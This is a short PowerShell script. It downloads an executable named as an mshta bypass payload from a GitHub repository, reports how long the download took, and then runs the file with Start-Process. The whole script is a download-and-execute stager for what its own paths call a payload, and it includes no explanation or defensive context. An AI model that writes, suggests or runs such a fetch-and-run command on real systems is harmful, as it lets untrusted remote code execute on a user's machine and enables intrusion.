$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/MshtaBypass/MshtaHtaOnlinePayload.exe'
$output = "MshtaHtaOnlinePayloadDownloaded.exe"
$start_time = Get-Date

[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 

wget $url -outfile $output

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

Start-Process -FilePath "MshtaHtaOnlinePayloadDownloaded.exe"

$DesktopPath = [Environment]::GetFolderPath('Desktop');